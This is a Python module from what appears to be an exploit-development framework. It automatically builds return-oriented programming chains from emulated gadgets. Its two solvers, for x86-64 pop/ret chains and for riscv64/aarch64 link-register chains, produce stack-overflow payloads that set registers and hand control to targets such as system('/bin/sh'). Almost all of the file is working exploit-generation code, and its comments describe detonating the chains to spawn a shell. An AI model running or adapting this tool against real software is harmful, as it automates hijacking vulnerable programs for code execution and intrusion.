"""ROP-chain SOLVER: turn the semantic gadget engine's effect inventory into a concrete stack
payload that sets a chosen register state and transfers control to a chosen address (a syscall site,
a function, a `system`). Where the pattern-matched builders assume a fixed gadget shape, this
composes from WHATEVER clean register-control gadgets the target actually has -- discovered by
`gadget_emu` (emulation, so the effects are real, not inferred).

Soundness: the solver only emits a chain; it never claims the chain WORKS. The caller detonates it
and confirms the effect (a spawned shell, a written marker, a reached breakpoint) with a negative
control, exactly as every other lykos exploit is confirmed. A chain built on a wrong gadget simply
fails to confirm.

Scope here: STACK-POPPING arches (x86-64), where a register setter is a `pop <reg>; ret` and the
chain is the classic contiguous layout -- each gadget's `ret` pops the next gadget's address off the
stack. Link-register arches (riscv/aarch64, where `ret`=`jr ra` and every link must restore ra) need
the ordered ra-threading variant; this module reports honestly (returns None) for an arch whose
setters are not stack-pop, rather than emit a layout that cannot chain.
"""
from __future__ import annotations

from . import gadget_emu

# Callee-saved GPRs per link-register arch -- the registers a function epilogue (the LOADER) restores
# from the overflow, hence the ones a chain can set and a `mv a0,sS; jr sB` caller can source from.
_CALLEE = {
    "riscv64": {f"x{i}" for i in (8, 9, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27)},
    "riscv": {f"x{i}" for i in (8, 9, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27)},
    "aarch64": {f"x{i}" for i in range(19, 29)},
}


def _pop_setters(gadgets, reg):
    """Clean stack-pop setters for `reg`: term `ret`, reg loaded from the stack, smallest sp-adjust
    first (fewest incidental pops to pad around)."""
    out = [g for g in gadgets
           if g.get("term") == "ret" and str(g["effects"].get(reg, "")).startswith("stack@")]
    out.sort(key=lambda g: g["spadj"])
    return out


def solve_reg_chain(data: bytes, arch: str, *, sets: dict, final_va: int, offset: int,
                    word: int = 8, segments=None, max_insns: int = 4, pad: bytes = b"A"):
    """Synthesize a stack payload that sets each register in `sets` ({regname: value}) via clean
    stack-pop gadgets, then transfers to `final_va`.

    Returns {"payload": bytes, "chain": [(gadget_va, reg, value)], "final": final_va} or None when a
    requested register has no clean pop setter (the honest "cannot compose" answer) or the arch is
    not stack-popping / the engine is unavailable."""
    if not gadget_emu.available() or not gadget_emu.arch_supported(arch):
        return None
    if segments is None:
        # Derive the executable segments WITH their real vaddrs so gadget VAs are ABSOLUTE (a
        # file-offset VA would not match final_va / a loaded address). Without this a no-PIE target's
        # gadgets come back at file offsets and the chain jumps nowhere.
        from .rop import _loads
        segments = [(o, s, v) for o, s, v, fl in _loads(data) if fl & 1] or None
    want = tuple(sets)
    gadgets = gadget_emu.find_reg_control_gadgets(
        data, arch, want=want, segments=segments, max_insns=max_insns,
        max_results=400000, scan_cap=40_000_000)
    chosen = {}
    for reg in sets:
        setters = _pop_setters(gadgets, reg)
        if not setters:
            return None                                   # no clean setter -> cannot compose (honest)
        chosen[reg] = setters[0]

    def p(v):
        return (v & ((1 << (word * 8)) - 1)).to_bytes(word, "little")

    body = bytearray()
    chain = []
    for reg, val in sets.items():
        g = chosen[reg]
        n = int(g["effects"][reg].split("@")[1])          # stack offset the pop loads `reg` from
        span = g["spadj"]                                 # bytes this gadget pops before its `ret`
        region = bytearray((pad * ((span // len(pad)) + 1))[:span])
        region[n:n + word] = p(val)                       # the value the pop loads into `reg`
        body += p(g["va"]) + region                       # gadget addr, then its popped region
        chain.append((g["va"], reg, val))
    body += p(final_va)                                   # the final `ret` transfers here
    payload = pad * ((offset // len(pad)) + 1)
    payload = bytearray(payload[:offset]) + body
    return {"payload": bytes(payload), "chain": chain, "final": final_va}


def solve_lr_chain(data: bytes, arch: str, *, set_a0: int, call_va: int, offset: int,
                   segments=None, max_insns: int = 16, max_candidates: int = 60,
                   stack_range=(8, 168, 8), word: int = 8):
    """Link-register chain (riscv64 / aarch64): set a0 = `set_a0` and transfer control to `call_va`,
    via a LOADER (an epilogue that restores callee-saved regs + the return register from the overflow,
    then `ret`) feeding a CALLER (`mv a0,sS; jr sB`). On these arches `ret`=`jr ra`, so the loader's
    restored ra is what reaches the caller; the caller's branch register is the final hop.

    Composed from gadgets DISCOVERED by gadget_emu (emulated effects): a caller is a gadget whose a0
    becomes a callee-saved reg and whose terminator is `jr:<that-or-another callee-saved reg>`; a
    loader is a ret-terminated gadget that loads the caller's source + branch regs AND ra from the
    stack. The loader's entry sp lands at an offset in the overflow that the vulnerable frame decides,
    so this returns CANDIDATE payloads over that position for the caller to confirm (detonate +
    negative control). Returns a list of {payload, caller, loader, stack_pos, sS, sB} (newest-compact
    first), or [] when no loader+caller composes -- the honest 'cannot compose on this target'.

    One register only (a0). execve needs a1=a2=0 too; those need ra-restoring zeroing gadgets for
    a1/a2, which are arch/target-dependent (riscv libc lacks a clean a2/envp one) -- a multi-register
    extension. a one-argument target (system("/bin/sh")) needs only this."""
    arch = (arch or "").lower()
    callee = _CALLEE.get(arch)
    if callee is None or not gadget_emu.available():
        return []
    if segments is None:
        from .rop import _loads
        segments = [(o, s, v) for o, s, v, fl in _loads(data) if fl & 1] or None

    # CALLERS: a0 <- a callee-saved reg, terminator `jr <callee-saved reg>` (mv a0,sS; jr sB).
    gc = gadget_emu.find_reg_control_gadgets(data, arch, want=("a0",), segments=segments,
                                             max_insns=6, max_results=max_candidates * 20,
                                             scan_cap=120_000_000)
    callers = []
    for g in gc:
        a0 = g["effects"].get("a0", "")
        if not a0.startswith("reg:"):
            continue
        sS = a0.split(":", 1)[1]
        if not (g["term"].startswith("jr:") and sS in callee):
            continue
        sB = g["term"].split(":", 1)[1]
        if sB in callee and sB != sS and g.get("spadj", 0) == 0:   # caller does not itself touch sp
            callers.append((g["va"], sS, sB))

    # LOADERS: ret-terminated, ra restored from the stack, and the caller's {sS,sB} loaded from the
    # stack (so we inject &/bin/sh and the call target). gadget_emu gives each stack offset + spadj.
    gl = gadget_emu.find_reg_control_gadgets(data, arch, want=tuple(callee) + ("ra",),
                                             segments=segments, max_insns=max_insns,
                                             max_results=max_candidates * 40, scan_cap=200_000_000)
    loaders = []
    for g in gl:
        ra = g["effects"].get("ra", "")
        if g["term"] != "ret" or not ra.startswith("stack@"):
            continue
        regoff = {r: int(v.split("@")[1]) for r, v in g["effects"].items()
                  if r in callee and v.startswith("stack@")}
        if regoff:
            loaders.append({"va": g["va"], "raoff": int(ra.split("@")[1]),
                            "spadj": g["spadj"], "regoff": regoff})

    def p(v):
        return (v & ((1 << (word * 8)) - 1)).to_bytes(word, "little")

    out = []
    for cva, sS, sB in callers:
        for ld in loaders:
            if sS not in ld["regoff"] or sB not in ld["regoff"]:
                continue                                           # loader must set both source+branch
            for sp in range(*stack_range):
                tot = sp + max(ld["regoff"][sS], ld["regoff"][sB], ld["raoff"]) + 2 * word
                buf = bytearray(b"A" * tot)
                buf[offset:offset + word] = p(ld["va"])            # overwritten saved ra -> loader
                buf[sp + ld["regoff"][sS]:sp + ld["regoff"][sS] + word] = p(set_a0)   # sS = &"/bin/sh"
                buf[sp + ld["regoff"][sB]:sp + ld["regoff"][sB] + word] = p(call_va)  # sB = target
                buf[sp + ld["raoff"]:sp + ld["raoff"] + word] = p(cva)                # ra -> caller
                out.append({"payload": bytes(buf), "caller": cva, "loader": ld["va"],
                            "stack_pos": sp, "sS": sS, "sB": sB})
                if len(out) >= max_candidates:
                    return out
    return out
